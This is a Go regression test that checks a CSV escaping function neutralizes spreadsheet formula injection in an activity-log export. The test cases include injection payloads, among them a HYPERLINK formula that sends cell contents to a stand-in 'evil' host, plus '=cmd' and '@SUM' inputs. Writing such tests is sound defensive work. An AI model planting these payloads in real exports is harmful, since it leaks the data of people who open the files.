package handlers

import "testing"

// Regression for: the activity-log CSV export must neutralize spreadsheet
// formula injection. A cell whose first char is = + - @ tab or CR executes as a
// formula in Excel/Sheets; audit values (user email, error message, resource
// type, etc.) are attacker-influenceable. Mirrors inventory-service's fix.
func TestEscapeCSV_NeutralizesFormulaInjection(t *testing.T) {
	cases := []struct{ in, want string }{
		{`=HYPERLINK("http://evil/?"&A1)`, `"'=HYPERLINK(""http://evil/?""&A1)"`}, // = + comma/quote → prefixed AND quoted
		{"=cmd", "'=cmd"},
		{"+1+1", "'+1+1"},
		{"-2+3", "'-2+3"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tlead-tab", "'\tlead-tab"},
		{"victim@example.com", "victim@example.com"}, // @ not leading → untouched
		{"normal-value", "normal-value"},             // safe → untouched
		{"", ""},                                     // empty → untouched
	}
	for _, c := range cases {
		if got := escapeCSV(c.in); got != c.want {
			t.Errorf("escapeCSV(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
